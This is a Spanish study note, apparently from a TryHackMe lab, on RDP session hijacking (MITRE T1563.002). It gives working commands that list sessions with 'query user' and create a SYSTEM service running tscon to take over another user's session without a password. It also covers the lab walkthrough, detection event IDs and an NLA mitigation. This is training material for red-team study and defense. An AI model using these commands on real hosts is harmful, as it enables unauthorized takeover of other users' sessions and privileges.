---
tags: [red-team, lateral-movement, rdp, session-hijacking, tscon]
created: 2026-04-21
source: TryHackMe - Lateral Movement and Pivoting
related:
  - "[[Use of Alternate Authentication Material]]"
  - "[[Moving Through the Network]]"
---

En lugar de robar credenciales, podemos **secuestrar sesiones existentes** de otros usuarios. Si un usuario con mayores privilegios ya tiene una sesión RDP activa en un host al que tenemos acceso SYSTEM, podemos "saltar" dentro de su sesión sin conocer su contraseña.

> [!info] MITRE ATT&CK: **T1563.002 — RDP Hijacking**

---

## RDP Session Hijacking con tscon

### Requisitos
- Privilegios **SYSTEM** en el host destino
- Una sesión del usuario víctima (activa o desconectada) en ese mismo host

### Paso 1 — Listar sesiones

```shell
query user
```

Ejemplo de salida:

```
 USERNAME         SESSIONNAME   ID  STATE    IDLE TIME  LOGON TIME
 administrator    rdp-tcp#2      1  Active      .      ...
 t1_toby.beck                    3  Disc        1      ...
```

### Paso 2 — Obtener SYSTEM

Crear un servicio que ejecute `tscon` como SYSTEM para saltar a la sesión víctima:

```shell
sc.exe create sesshijack binPath= "cmd.exe /k tscon 3 /dest:rdp-tcp#2"
sc.exe start sesshijack
```

Donde:
- `3` = ID de la sesión víctima
- `rdp-tcp#2` = sesión destino (la nuestra)

> [!tip] Al ejecutarse como SYSTEM, `tscon` **no pide contraseña** para conectar a la sesión de otro usuario. Esta es una característica oficial de Windows, no una vulnerabilidad.

### Paso 3 — Acceso a la sesión

Inmediatamente nuestra ventana RDP pasa a ser la sesión del usuario víctima, con todos sus privilegios y aplicaciones abiertas.

---

## Comandos Clave

```shell
query user                              # Listar sesiones
quser /server:HOST                      # Desde otro host
sc.exe create hj binPath= "cmd.exe /k tscon <ID> /dest:<MI_SESSION>"
sc.exe start hj
```

---

## Flujo en la room (THMJMP2)

1. Acceder a `THMJMP2` como administrador local.
2. Ejecutar `query user` y localizar la sesión de `t1_toby.beck`.
3. Crear el servicio con `tscon` apuntando de su ID a nuestra sesión RDP.
4. Iniciar el servicio → la ventana RDP cambia al escritorio de Toby.
5. Ejecutar `flag.exe` desde el escritorio secuestrado.

---

## Detección / Mitigaciones

> [!warning] Eventos a monitorear:
> - **Event ID 4624** logon type 10 (RemoteInteractive) y **4778/4779** (session reconnect/disconnect)
> - Creación de servicios que invoquen `tscon.exe`
> 
> Mitigación: aplicar la GPO **"Require user authentication for remote connections by using Network Level Authentication"** y limitar logons administrativos.